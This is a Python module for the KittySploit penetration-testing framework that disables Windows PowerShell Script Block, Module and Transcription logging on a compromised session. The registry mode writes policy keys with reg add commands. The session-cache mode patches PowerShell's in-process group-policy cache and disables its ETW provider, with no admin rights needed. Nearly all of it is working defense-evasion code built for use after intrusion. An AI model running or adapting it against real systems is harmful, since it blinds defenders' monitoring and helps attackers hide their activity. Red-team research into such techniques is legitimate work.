#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *

from lib.c2.stager_evasion import (
    PS_ETW_PROVIDER_DISABLE_PS,
    PS_MODULE_CACHE_BYPASS_PS,
    PS_SCRIPTBLOCK_CACHE_BYPASS_PS,
    PS_TRANSCRIPTION_CACHE_BYPASS_PS,
)
from lib.post.windows.session import WindowsSessionMixin

_PS_LOGGING_KEYS = (
    (
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging",
        "EnableScriptBlockLogging",
        0,
    ),
    (
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging",
        "EnableModuleLogging",
        0,
    ),
    (
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription",
        "EnableTranscripting",
        0,
    ),
    (
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription",
        "EnableInvocationHeader",
        0,
    ),
)


class Module(Post, WindowsSessionMixin):
    __info__ = {
        "name": "Windows Disable PowerShell Logging",
        "description": (
            "Disable PowerShell Script Block, Module, and Transcription logging. "
            "Modes: registry (admin GPO keys) or session_cache (in-process "
            "cachedGroupPolicySettings + PS ETW provider — no admin required)."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "https://attack.mitre.org/techniques/T1562/002/",
            "https://redteamrecipes.com/blog/2025/11/Evasion/",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 4,
            "reversible": False,
            "approval_required": True,
            "produces": ["risk_signals"],
            "cost": 1.2,
            "noise": 0.5,
            "value": 0.9,
            "requires": {"capabilities_any": ["shell"], "capabilities_all": []},
            "chain": {"consumes_capabilities": ["shell"], "produces_capabilities": []},
        },
    }

    mode = OptChoice(
        "session_cache",
        "registry = HKLM policy keys (admin); session_cache = in-process GPO cache",
        False,
        choices=["session_cache", "registry"],
    )
    include_transcription = OptBool(True, "Also disable transcription policy/cache", False)
    include_module = OptBool(True, "Also disable module logging", False)
    disable_ps_etw = OptBool(
        True,
        "Also zero PS ETW provider (session_cache mode)",
        False,
    )
    verify = OptBool(True, "Re-read policy keys after registry changes", False)

    def _run_registry(self) -> bool:
        if not self.win_is_admin():
            print_error("Administrator privileges are required for registry mode.")
            print_info("Use mode=session_cache for an unprivileged in-process bypass.")
            return False

        print_warning(
            "Registry changes may still leave existing 4104 events; "
            "prefer running before sensitive PowerShell operations."
        )

        keys = list(_PS_LOGGING_KEYS)
        if not self.include_transcription:
            keys = [k for k in keys if "Transcription" not in k[0]]
        if not self.include_module:
            keys = [k for k in keys if "ModuleLogging" not in k[0]]

        ok = True
        for hive_path, name, value in keys:
            out = self.win_execute(
                f'reg add "{hive_path}" /v {name} /t REG_DWORD /d {value} /f',
                timeout=10,
            )
            if "successfully" in (out or "").lower() or "réussi" in (out or "").lower():
                print_success(f"Set {name}=0 under {hive_path}")
            else:
                print_warning(f"Could not set {name}: {out or 'no output'}")
                ok = False

        if self.verify:
            print_info("-" * 60)
            print_info("Verification")
            for hive_path, name, _ in keys:
                out = self.win_execute(f'reg query "{hive_path}" /v {name}', timeout=8)
                print_info(f"{name}: {out or '(not set)'}")
        return ok

    def _run_session_cache(self) -> bool:
        if not self.win_require_powershell():
            return False

        print_status("Patching PowerShell GPO cache in current process...")
        parts = [PS_SCRIPTBLOCK_CACHE_BYPASS_PS]
        if self.include_module:
            parts.append(PS_MODULE_CACHE_BYPASS_PS)
        if self.include_transcription:
            parts.append(PS_TRANSCRIPTION_CACHE_BYPASS_PS)
            print_warning(
                "Transcription cache bypass is most effective before a custom "
                "runspace is opened; current console may keep an open transcript."
            )
        if self.disable_ps_etw:
            parts.append(PS_ETW_PROVIDER_DISABLE_PS)

        out = self.win_run_powershell("".join(parts) + "; 'PS_LOG_CACHE_OK'", timeout=15)
        if "PS_LOG_CACHE_OK" in (out or ""):
            print_success("In-process ScriptBlock/Module logging cache patched.")
            print_info("Effect is limited to this PowerShell process lifetime.")
            return True
        print_warning("Session cache bypass did not confirm success.")
        print_debug(out or "")
        return False

    def run(self):
        if not self.win_require_windows():
            return False

        mode = str(self.mode or "session_cache").lower()
        if mode == "registry":
            return self._run_registry()
        return self._run_session_cache()
